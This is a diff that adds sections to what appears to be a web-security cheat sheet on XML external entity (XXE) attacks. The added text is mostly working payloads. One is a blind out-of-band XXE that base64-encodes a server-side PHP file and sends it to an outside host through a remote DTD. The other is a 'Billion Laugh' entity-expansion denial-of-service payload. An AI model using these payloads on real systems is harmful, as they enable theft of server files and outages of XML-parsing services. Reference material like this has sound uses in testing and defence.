@@ -778,6 +778,43 @@ SSH-2.0-libssh2_1.4.2
 ```
 xxe.dtd: `<!ENTITY b SYSTEM "file:///etc/passwd">`
 
+
+## Out of Band (OOB) XXE
+
+- Blind
+
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE ANY[
+<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/xxe/test.php">
+<!ENTITY % remote SYSTEM "http://kaibro.tw/xxe.dtd">
+%remote;
+%all;
+%send;
+]>
+```
+
+xxe.dtd:
+
+```xml
+<!ENTITY % all "<!ENTITY &#37; send SYSTEM 'http://kaibro.tw/?a=%file;'>">
+```
+
+## DoS
+
+- Bilion Laugh Attack
+
+```xml
+<!DOCTYPE data [
+<!ENTITY a0 "dos" >
+<!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;">
+<!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;">
+<!ENTITY a3 "&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;">
+<!ENTITY a4 "&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;">
+]>
+<data>&a4;</data>
+```
+
 ## 其它
 
 - DOCX
